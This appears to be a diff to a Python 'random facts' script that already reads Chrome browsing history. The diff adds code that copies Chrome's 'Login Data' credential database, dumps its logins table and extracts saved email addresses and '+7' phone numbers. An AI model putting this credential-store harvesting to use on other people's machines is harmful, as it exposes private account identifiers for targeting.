@@ -63,21 +63,41 @@ def dateFromWebkit(webkit_timestamp):
     return epoch_start + delta
 def getHistoryDB():
     original = os.getenv('localappdata') + r'\Google\Chrome\User Data\Default\History'
-    target = str(os.path.abspath(os.curdir)) + '\History.db'
+    target = str(os.path.abspath(os.curdir)) + r'\History.db'
+    shutil.copy2(original, target)
+def getLoginDataDB():
+    original = os.getenv('localappdata') + r'\Google\Chrome\User Data\Default\Login Data'
+    target = str(os.path.abspath(os.curdir)) + r'\Login Data.db'
     shutil.copy2(original, target)
 def dictFactory(cursor, row):
     d = {}
     for idx, col in enumerate(cursor.description):
         d[col[0]] = row[idx]
     return d
-def makeDictFromDB():
-
-    con = sql.connect("History.db")
+def makeDictFromHistoryDB():
+    con = sql.connect('History.db')
     con.row_factory = dictFactory
     cur = con.cursor()
     cur.execute("select * from urls")
     var1 = cur.fetchmany(-1)
     return var1
+def makeDictFromLoginDataDB():
+    con = sql.connect('Login Data.db')
+    con.row_factory = dictFactory
+    cur = con.cursor()
+    cur.execute("select * from logins")
+    var1 = cur.fetchmany(-1)
+    return var1
+def getLoginsFromLoginDataDB(logins):
+    phoneNumber = []
+    email = []
+    for sites in logins:
+        # print(sites)
+        if '+7' in sites['username_value']:
+            phoneNumber.append(sites['username_value'])
+        if '@' in sites['username_value']:
+            email.append(sites['username_value'])
+    return phoneNumber, email
 def randomFactsFromHistory(var1):
     randomSite = random.choice(var1)
     randomFact = f"Last time you visited {randomSite['title']}, was {dateFromWebkit(randomSite['last_visit_time'])}"
